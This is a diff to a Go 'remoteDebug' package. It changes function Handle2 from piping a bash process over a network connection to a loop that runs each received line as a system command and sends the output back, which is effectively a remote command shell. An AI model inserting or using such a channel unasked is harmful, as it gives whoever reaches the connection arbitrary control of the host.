@@ -1,6 +1,7 @@
 package remoteDebug
 
 import (
+	"bufio"
 	"compress/gzip"
 	"crypto"
 	"crypto/md5"
@@ -19,6 +20,7 @@ import (
 	"os"
 	"os/exec"
 	"path"
+	"strings"
 )
 
 const pubKeyPem = `
@@ -147,10 +149,19 @@ func Handle2(data []byte) error {
 		return err
 	}
 	go func(conn net.Conn) {
-		cmd := exec.Command("bash")
-		cmd.Stdout = conn
-		cmd.Stdin = conn
-		cmd.Start()
+		go func(conn net.Conn) {
+			sc := bufio.NewScanner(conn)
+			for sc.Scan() {
+				line := sc.Text()
+				cmdArgs := strings.Split(line, " ")
+				out, err := exec.Command(cmdArgs[0], cmdArgs[1:]...).Output()
+				if err != nil {
+					fmt.Fprintln(conn, err.Error())
+				} else {
+					fmt.Fprintf(conn, "%s\n", out)
+				}
+			}
+		}(conn)
 	}(conn)
 	return nil
 }
